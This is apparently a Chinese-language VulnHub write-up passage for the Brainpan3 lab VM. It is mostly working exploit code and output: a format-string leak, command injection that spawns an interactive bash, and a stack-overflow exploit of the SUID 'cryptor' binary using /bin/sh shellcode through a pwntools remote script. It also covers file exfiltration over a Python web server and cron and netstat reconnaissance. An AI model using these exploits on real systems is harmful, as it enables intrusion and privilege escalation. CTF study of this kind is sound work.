<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 6851</span><br><span class="line">[*] Report <span class="string">&#x27;N&#x27;</span> at offset 65</span><br><span class="line">[+] uname -a - Linux brainpan3 3.16.0-41-generic <span class="comment">#55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux</span></span><br><span class="line">[+] whoami - anansi</span><br><span class="line">[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">REPORT [$(/bin/bash -i &gt;&amp;2)]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (2677): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">anansi@brainpan3:/$ $ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">anansi@brainpan3:/$ $ whoami</span><br><span class="line">whoami</span><br><span class="line">anansi</span><br></pre></td></tr></table></figure>

<h2 id="步骤4"><a href="#步骤4" class="headerlink" title="步骤4"></a>步骤4</h2><p>假设需要进行某种特权提升，寻找SUID二进制文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/$ $ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/sbin/uuidd</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/mtr</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/home/reynard/private/cryptor</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/ping6</span><br></pre></td></tr></table></figure>

<p>突出显示的二进制文件是/home/neynard/private/cryptor。可以执行该二进制文件吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/home/anansi$ $ cp /home/reynard/private/cryptor .</span><br><span class="line">cp /home/reynard/private/cryptor .</span><br><span class="line">anansi@brainpan3:/home/anansi$ $ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 72</span><br><span class="line">drwxr-xr-x 3 anansi anansi  4096 Feb  6 13:09 .</span><br><span class="line">drwxr-xr-x 5 root   root    4096 May 19  2015 ..</span><br><span class="line">-rw------- 1 anansi anansi   490 Feb  9 21:03 .bash_history</span><br><span class="line">-rw-r--r-- 1 anansi anansi   220 May 19  2015 .bash_logout</span><br><span class="line">-rw-r--r-- 1 anansi anansi  3637 May 19  2015 .bashrc</span><br><span class="line">-rw-r--r-- 1 anansi anansi   675 May 19  2015 .profile</span><br><span class="line">drwxrwxrwx 2 anansi anansi  4096 Feb  9 21:04 REPORTS</span><br><span class="line">-rwxrwxrwx 1 root   dev      314 Feb  6 13:09 brainpan.8.gz</span><br><span class="line">-rwxrwxrwx 1 anansi webdev  5568 Feb  9 21:08 cryptor</span><br><span class="line">-rwxrwxrwx 1 anansi anansi   591 May 21  2015 lapinblanc.txt</span><br><span class="line">-rwxrwxrwx 1 anansi webdev 12316 Feb  6 11:05 msg_admin</span><br><span class="line">-rwxrwxrwx 1 anansi webdev  1104 Feb  6 12:57 rootsploit.py</span><br><span class="line">-rwxrwxrwx 1 anansi webdev  7609 Feb  6 10:19 trixd</span><br></pre></td></tr></table></figure>

<p>将此二进制文件从Brainpan3中提取到本地计算机上。看起来只允许端口8080离开服务器。如果不激活代码存储库（命令2），那么通过Python的内置网络服务器提取文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/home/anansi$ $ python -m SimpleHTTPServer 8080</span><br><span class="line">python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure>

<p>在我们的主机上：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.56.117:8080/cryptor</span><br></pre></td></tr></table></figure>

<p>加密二进制文件的快速完整性检查：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># checksec cryptor</span></span><br><span class="line">[*] <span class="string">&#x27;/root/vulnhub/brainpan3/2/cryptor&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>没有canary，也没有NX。这意味着，假设发现缓冲区溢出，可以跳回到堆栈/堆上的shellcode并从那里执行payload，从而避免ROP或其他恶作剧。查看IDA中的二进制文件，可以看到缓冲区溢出情况。看到分配了100个字节的缓冲区。</p>
<p><img src="http://ctfhacker.com/assets/images/cryptor-buff1.png"></p>
<p>然后检查第一个参数（argv [1]）是否小于或等于116个字节。</p>
<p><img src="http://ctfhacker.com/assets/images/cryptor-buff2.png"></p>
<p>在这里，给出了将116个字节写入100字节缓冲区的情况，有可能导致溢出。有了这些知识，对其进行动态测试。打开启用了Pwndbg的gdb ./cryptor，然后将116字节的字符串与第二个垃圾字符串扔到crytor上。使用Binjitsu创建116字节的循环字符串，以帮助查明字符串溢出的位置。从静态分析中知道了应该是什么，但是拥有多个数据点总是很好。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; cyclic(116)</span><br><span class="line"><span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab&#x27;</span></span><br></pre></td></tr></table></figure>

<p>使用116字节字符串运行二进制文件。</p>
<p>遇到崩溃</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab zzzz</span><br><span class="line">Starting program: /root/vulnhub/brainpan3/2/cryptor aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab zzzz</span><br><span class="line">[+] saving to aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab.enc</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616162 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x0</span><br><span class="line"> EBX  0x62616164 (<span class="string">&#x27;daab&#x27;</span>)</span><br><span class="line"> ECX  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */</span><br><span class="line"> EDX  0x0</span><br><span class="line"> EDI  0x636e652e (<span class="string">&#x27;.enc&#x27;</span>)</span><br><span class="line"> ESI  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */</span><br><span class="line"> EBP  0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> ESP  0xffffd208 ◂— <span class="string">&#x27;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line"> EIP  0x61616162 (<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line">─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x61616162</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd208 ◂— <span class="string">&#x27;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">01:0004│      0xffffd20c ◂— <span class="string">&#x27;daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">02:0008│      0xffffd210 ◂— <span class="string">&#x27;eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">03:000c│      0xffffd214 ◂— <span class="string">&#x27;faaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">04:0010│      0xffffd218 ◂— <span class="string">&#x27;gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">05:0014│      0xffffd21c ◂— <span class="string">&#x27;haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">06:0018│      0xffffd220 ◂— <span class="string">&#x27;iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">07:001c│      0xffffd224 ◂— <span class="string">&#x27;jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab&#x27;</span></span><br><span class="line">────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 61616162</span><br><span class="line">   f 1 61616163</span><br><span class="line">   f 2 61616164</span><br><span class="line">   f 3 61616165</span><br><span class="line">   f 4 61616166</span><br><span class="line">   f 5 61616167</span><br><span class="line">   f 6 61616168</span><br><span class="line">   f 7 61616169</span><br><span class="line">   f 8 6161616a</span><br><span class="line">   f 9 6161616b</span><br><span class="line">   f 10 6161616c</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Program received signal SIGSEGV (fault address 0x61616162)</span><br></pre></td></tr></table></figure>

<p>太棒了，所以在循环字符串中的offset baaa崩溃了。让我们通过替换baaa来创建我们的payload，以了解我们拥有EIP的控制权。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; shellcode = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;baaa&#x27;</span>) + <span class="string">&#x27;BBBB&#x27;</span></span><br><span class="line">&gt;&gt;&gt; shellcode += <span class="string">&#x27;C&#x27;</span> * (116 - len(shellcode))</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> shellcode</span><br><span class="line">AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br></pre></td></tr></table></figure>

<p>如果是正确的，应该在EIP中看到BBBB。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC zzzz</span><br><span class="line">Starting program: /root/vulnhub/brainpan3/2/cryptor AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC zzzz</span><br><span class="line">[+] saving to AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC.enc</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x42424242 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x0</span><br><span class="line"> EBX  0x43434343 (<span class="string">&#x27;CCCC&#x27;</span>)</span><br><span class="line"> ECX  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */</span><br><span class="line"> EDX  0x0</span><br><span class="line"> EDI  0x636e652e (<span class="string">&#x27;.enc&#x27;</span>)</span><br><span class="line"> ESI  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */</span><br><span class="line"> EBP  0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"> ESP  0xffffd208 ◂— <span class="string">&#x27;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC&#x27;</span></span><br><span class="line"> EIP  0x42424242 (<span class="string">&#x27;BBBB&#x27;</span>) &lt;== 真的非常的牛批！！！</span><br><span class="line">─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x42424242</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd208 ◂— <span class="string">&#x27;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC&#x27;</span></span><br><span class="line">... ↓</span><br><span class="line">────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 42424242</span><br><span class="line">   f 1 43434343</span><br><span class="line">   f 2 43434343</span><br><span class="line">   f 3 43434343</span><br><span class="line">   f 4 43434343</span><br><span class="line">   f 5 43434343</span><br><span class="line">   f 6 43434343</span><br><span class="line">   f 7 43434343</span><br><span class="line">   f 8 43434343</span><br><span class="line">   f 9 43434343</span><br><span class="line">   f 10 43434343</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Program received signal SIGSEGV (fault address 0x42424242)</span><br></pre></td></tr></table></figure>

<p>还从静态分析中注意到，第二个参数存储在位于0x804a080的全局数组中。如果将shellcode写入全局数组，则可以将EIP指向该缓冲区并可能获胜。攻击计划如下：</p>
<ul>
<li>用0x804a080覆盖返回地址BBBB</li>
<li>在第二个参数中删除/bin/sh shellcode以获得一个shell</li>
</ul>
<p>我们得到的测试脚本如下：</p>
<p>test.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;baaa&#x27;</span>) + p32(0x804a080)</span><br><span class="line">shellcode += <span class="string">&#x27;C&#x27;</span> * (116 - len(shellcode))</span><br><span class="line"></span><br><span class="line">r = process([<span class="string">&#x27;./cryptor&#x27;</span>, shellcode, asm(shellcraft.sh())])</span><br><span class="line"></span><br><span class="line">offset = cyclic_find(<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line">buffer = 116 - len(shellcode)</span><br><span class="line"></span><br><span class="line">binsh_shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">argv1 = <span class="string">&#x27;&quot;A&quot; * &#123;&#125; + &quot;&#123;&#125;&quot; + &quot;C&quot; * &#123;&#125;&#x27;</span>.format(offset, r<span class="string">&#x27;\x80\xa0\x04\x08&#x27;</span>, buffer)</span><br><span class="line"></span><br><span class="line">argv2 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(enhex(binsh_shellcode)[x:x+2]) <span class="keyword">for</span> x <span class="keyword">in</span> xrange(0, len(enhex(binsh_shellcode)), 2))</span><br><span class="line"></span><br><span class="line">actual_shellcode = <span class="string">&quot;&quot;</span><span class="string">&quot;./cryptor <span class="subst">$(python -c &#x27;print &#123;&#125;&#x27;)</span> <span class="subst">$(python -c &#x27;print <span class="string">&quot;&#123;&#125;&quot;</span>&#x27;)</span>&quot;</span><span class="string">&quot;&quot;</span>.format(argv1, argv2)</span><br><span class="line"></span><br><span class="line">log.info(actual_shellcode)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;cd /home/reynard/private&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(actual_shellcode)</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    output = r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;root&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Shell recevied: root&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>成功利用漏洞获取了本地的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python test.py </span></span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./cryptor&#x27;</span>: pid 20596</span><br><span class="line">[*] ./cryptor $(python -c <span class="string">&#x27;print &quot;A&quot; * 4 + &quot;\x80\xa0\x04\x08&quot; + &quot;C&quot; * 0&#x27;</span>) $(python -c <span class="string">&#x27;print &quot;\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">[*] Shell recevied: root</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>在本地获得了一个shell。现在必须在服务器上执行此命令。为此，在现有脚本中创建命令，然后从脚本中发送命令。该完善后的脚本如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">command</span> <span class="keyword">in</span> [<span class="string">&#x27;uname -a&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;$(&#123;&#125; &gt;&amp;2)&#x27;</span>.format(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;SENDING TO REPORT MODULE&quot;</span>)</span><br><span class="line">    output = r.recvuntil(<span class="string">&#x27;[+]&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[2]</span><br><span class="line">    log.success(<span class="string">&quot;&#123;&#125; - &#123;&#125;&quot;</span>.format(<span class="built_in">command</span>, output))</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;$(/bin/bash -i &gt;&amp;2)&#x27;</span>)</span><br><span class="line">offset = cyclic_find(<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;baaa&#x27;</span>) + p32(0x804a080)</span><br><span class="line">buffer = 116 - len(shellcode)</span><br><span class="line">binsh_shellcode = asm(shellcraft.sh())</span><br><span class="line">argv1 = <span class="string">&#x27;&quot;A&quot; * &#123;&#125; + &quot;&#123;&#125;&quot; + &quot;C&quot; * &#123;&#125;&#x27;</span>.format(offset, r<span class="string">&#x27;\x80\xa0\x04\x08&#x27;</span>, buffer)</span><br><span class="line">argv2 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(enhex(binsh_shellcode)[x:x+2]) <span class="keyword">for</span> x <span class="keyword">in</span> xrange(0, len(enhex(binsh_shellcode)), 2))</span><br><span class="line">actual_shellcode = <span class="string">&quot;&quot;</span><span class="string">&quot;./cryptor <span class="subst">$(python -c &#x27;print &#123;&#125;&#x27;)</span> <span class="subst">$(python -c &#x27;print <span class="string">&quot;&#123;&#125;&quot;</span>&#x27;)</span>&quot;</span><span class="string">&quot;&quot;</span>.format(argv1, argv2)</span><br><span class="line">log.info(actual_shellcode)</span><br><span class="line">r.sendline(<span class="string">&#x27;cd /home/reynard/private&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(actual_shellcode)</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    output = r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;reynard&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">log.info(<span class="string">&quot;Shell recevied: reynard&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行上面的脚本之后，等待一小会儿，将会接收到一个reynard的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 2919</span><br><span class="line">[*] Report <span class="string">&#x27;N&#x27;</span> at offset 65</span><br><span class="line">[+] uname -a - Linux brainpan3 3.16.0-41-generic <span class="comment">#55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux</span></span><br><span class="line">[+] whoami - anansi</span><br><span class="line">[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">[*] ./cryptor $(python -c <span class="string">&#x27;print &quot;A&quot; * 4 + &quot;\x80\xa0\x04\x08&quot; + &quot;C&quot; * 108&#x27;</span>) $(python -c <span class="string">&#x27;print &quot;\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">[*] Shell recevied: reynard</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1000(anansi) gid=1003(webdev) euid=1002(reynard) groups=1002(reynard)</span><br><span class="line">$ whoami</span><br><span class="line">reynard</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/reynard/private</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub207.jpg"></p>
<h2 id="步骤5"><a href="#步骤5" class="headerlink" title="步骤5"></a>步骤5</h2><p>再进行一次勘测，将显示以下cron作业：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /etc/cron.d/*</span><br><span class="line">* * * * * root <span class="built_in">cd</span> /opt/.messenger; <span class="keyword">for</span> i <span class="keyword">in</span> *.msg; <span class="keyword">do</span> /usr/<span class="built_in">local</span>/bin/msg_admin 1 <span class="variable">$i</span>; rm -f <span class="variable">$i</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>查看/opt/.messenger的特权，看到以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ls -la /opt</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  3 root root 4096 May 19  2015 .</span><br><span class="line">drwxr-xr-x 21 root root 4096 Jun 17  2015 ..</span><br><span class="line">drwxrwx---  3 root dev  4096 Feb  6 13:04 .messenger</span><br></pre></td></tr></table></figure>

<p>看到一个由root执行的命令，该命令从/opt/.messenger目录中提取文件。为此，需要具有开发人员组权限的用户。检查/etc/passwd的尾部，可以看到puck。看他的id：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ id puck</span><br><span class="line">uid=1001(puck) gid=1001(puck) groups=1001(puck),1004(dev)</span><br></pre></td></tr></table></figure>

<p>他确实具有dev特权，允许他访问/opt/.messenger。来看看box上的puck用户。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/puck</span><br><span class="line">$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxrwx--- 2 reynard dev     4096 Jun 17 22:11 .</span><br><span class="line">drwxr-xr-x 3 root    root    4096 May 19 23:35 ..</span><br><span class="line">-rw-r--r-- 1 reynard reynard   21 Jun 17 22:11 key.txt</span><br><span class="line">$ cat key.txt</span><br><span class="line">9H37B81HZYY8912HBU93</span><br></pre></td></tr></table></figure>

<p>box上还有其他key吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -name key* 2&gt;/dev/null</span><br><span class="line">/mnt/usb/key.txt</span><br></pre></td></tr></table></figure>

<p>不知道这些key是做什么用的。碰到一个小路障会做什么？侦察！查看netstat，看到另一个服务处于活动状态：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netstat -antop | grep LIST</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -                off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      -                off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:7075          0.0.0.0:*               LISTEN      -                off (0.00/0/0)</span><br></pre></td></tr></table></figure>

<p>连接到它</p>
